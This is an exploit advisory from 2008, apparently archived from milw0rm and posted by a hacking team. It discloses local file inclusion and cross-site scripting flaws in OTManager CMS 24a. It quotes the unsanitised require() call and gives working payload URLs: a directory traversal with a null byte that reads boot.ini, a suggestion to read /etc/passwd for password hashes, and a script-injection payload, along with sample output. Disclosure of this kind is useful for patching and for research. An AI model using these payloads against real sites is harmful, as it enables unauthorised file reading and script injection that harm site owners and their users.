<html><head><title>OTManager CMS 24a (LFI/XSS) Multiple Remote Vulnerabilities</title></head><pre>===========================================================
  OTManager CMS (LFI/XSS) Multiple Remote Vulnerabilities
===========================================================

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /           
  / XXXXXX /
 (________(             
  `------'


AUTHOR : CWH Underground
DATE   : 27 June 2008
SITE   : cwh.citec.us


#####################################################
 APPLICATION : OTManager CMS
 VERSION     : 24a Completo
 VENDOR      : http://www.otmanager.org/
 DOWNLOAD    : http://downloads.sourceforge.net/otm/OTManager_v24a_Completo.zip
#####################################################

---------------------------------------
 Vulnerable File [index.php?conteudo=]
---------------------------------------

@Line

   76:  if($_REQUEST['conteudo']==&quot;&quot;){
   77:  require(&quot;Principal.php&quot;);
   78:  }else{
   79:  if(!file_exists($_REQUEST['conteudo'].&quot;.php&quot;)){
   80:  echo '&lt;center&gt;&lt;font size=&quot;3&quot;&gt;&lt;b&gt;404 URL Invalida&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&lt;br&gt;Por Favor, Selecione o Conteudo no Menu ao Lado.&lt;/center&gt;';
   81:  }else{
   82:       require($_REQUEST['conteudo'].&quot;.php&quot;);
   83:       }
   84:  }


---------
 Exploit
---------

#####
 LFI
#####

[+] http://[Target]/[otmanager_path]/index.php?conteudo=[LFI]

   
    This exploit will open boot.ini in system file:

[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)
\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)
\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect

    You can change boot.ini to /etc/passwd%00 in linux OS, For view pass hash.

#####
 XSS
#####

[+] http://[Target]/[otmanager_path]/index.php?conteudo=[XSS]


-------------
 POC Exploit
-------------

#####
 LFI
#####

[+] http://192.168.24.25/otmanager/index.php?conteudo=../../../../../../../../boot.ini%00

#####
 XSS
#####

[+] http://192.168.24.25/otmanager/index.php?conteudo=&lt;/title&gt;&lt;script&gt;alert('XSS test');&lt;/script&gt;


##################################################################
# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
##################################################################

# milw0rm.com [2008-06-27]</pre></html>